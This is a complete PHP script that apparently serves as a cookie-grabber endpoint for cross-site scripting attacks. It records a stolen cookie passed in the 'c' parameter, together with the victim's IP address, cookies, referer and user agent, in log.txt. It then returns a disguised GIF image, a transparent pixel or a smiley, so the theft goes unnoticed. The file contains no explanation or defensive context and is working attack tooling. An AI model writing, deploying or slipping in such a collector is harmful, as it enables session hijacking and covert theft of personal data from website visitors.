<?php

$i_get = [];
$i_get['ip'] = filter_input(INPUT_SERVER, 'REMOTE_ADDR', FILTER_SANITIZE_STRING);
$i_get['server_cookie'] = filter_input(INPUT_SERVER, 'HTTP_COOKIE', FILTER_SANITIZE_STRING);
$i_get['cookie'] = filter_input(INPUT_GET, 'c', FILTER_SANITIZE_STRING);
$i_get['i'] = filter_input(INPUT_GET, 'i', FILTER_SANITIZE_STRING);
$i_get['referer'] = filter_input(INPUT_SERVER, 'HTTP_REFERER', FILTER_SANITIZE_STRING);
$i_get['ua'] = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT', FILTER_SANITIZE_STRING);
$i_get['host'] = filter_input(INPUT_SERVER, 'REMOTE_HOST', FILTER_SANITIZE_STRING);
$i_get['query_string'] = filter_input(INPUT_SERVER, 'QUERY_STRING', FILTER_SANITIZE_STRING);

setcookie("sniffed",rand(0,9999));

$time = date("Y/m/d H:i.s",time());

$str="[".$time."]".PHP_EOL;
$str.="           IP: ".$i_get['ip'].PHP_EOL;
$str.="Server-Cookie: ".$i_get['server_cookie'].PHP_EOL;
$str.="       Cookie: ".$i_get['cookie'].PHP_EOL;
$str.="      Referer: ".$i_get['referer'].PHP_EOL;
$str.="   User-Agent: ".$i_get['ua'].PHP_EOL;
$str.="         Host: ".$i_get['host'].PHP_EOL;
$str.=" Query-String: ".$i_get['query_string'].PHP_EOL;
$str.=PHP_EOL.PHP_EOL;

$file = fopen ("log.txt", "a+");
fputs ($file, $str);
fclose($file);

$image_arr = [];
$image_arr['transparent']	= 'R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
$image_arr['smile']		= 'R0lGODlhIAAgAPcAAAAAAP///wYA/wcA/wUA+AQA9gUA8QYA8AUA7QYA7QYA7AYA6AUA5gUB/QUB9wQB8wUB8QYB5AYB4wQB3QQC/wUC/wYC/wUC/AUC+wUC7gQC2QQCywUCxgUD7AUD5QUD4wYE/wMCzQMG6AQD4wQD3wQD3gQD1wQDzwMExgMGxAMFwQQE/wQG/wQH+gQF+QQG7wUE7wUE7gQH7QQF5QQH5AQE4QQF3wQF3gQG2wUE2gQG1AUE1AQE0gMFvAMFuwMFuQMEtwMDtQMEtAMFsQQDrgUF/wUH/wUH/AUI+QUF9AUF8wUF8gUG8QUF6wUG6QQGywQEygQFyQQHyQQFxwQGxgQGxQQGxAQFvwQEuAQEtwMEmAMFkgMFiQYG/wYJ/wIIvAIIrAMK/wMH5AMI1AMHzgMIzAMIywMJxwMIxAIGnQIFmwIHjwIGjQIGhQQI6AMGvgMGvAMHuQMGtwMGtQMHrwMGrAMGqAMHqAMHnwMGngUK/wUO/wQHwQQHwAQHvwMHlwMGlZKUwf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh+QQFAACCACwAAAAAIAAgAAAI5gAFCRxIsKDBgwgTKlyYEEUBCTVsLBiBhqFCGGFOHOwTY4fFgl4qLLzS4qNAARQ+Hinz8YJJQU14MLTwUqARhg9qCmygEMLHLwU7KMxAsEhCJQaxJORA8MNLEwhv6CQoBWGOqQ4ERkGoYOoMgTIPHtAJQiCRDQgn1ExhQyCJhBqe6hmIIaEQtALV0FDIYmCcEgrLEpRxxiATqQNXLPzxwiCZCAYQ6IAC0qILPya7vPkoxglDHEhqgnED5yAQMyKmCtyTYAoDAgM8WAmheuCSgSqS1FbIZ3fCKr4RPgl+cAxxg2GPqw4IADs=
';

$image = $image_arr['smile'];
if ($i_get['i']) {
	$image = $image_arr['transparent'];
}


$gzipped = gzencode(base64_decode($image),6);

header("Content-type: image/gif;");
header('Content-Encoding: gzip');
header('Content-Length: '.strlen($gzipped));
header('Cache-Control: no-cache, no-store, max-age=0, must-revalidate');
header('Pragma: no-cache');

echo $gzipped;

?>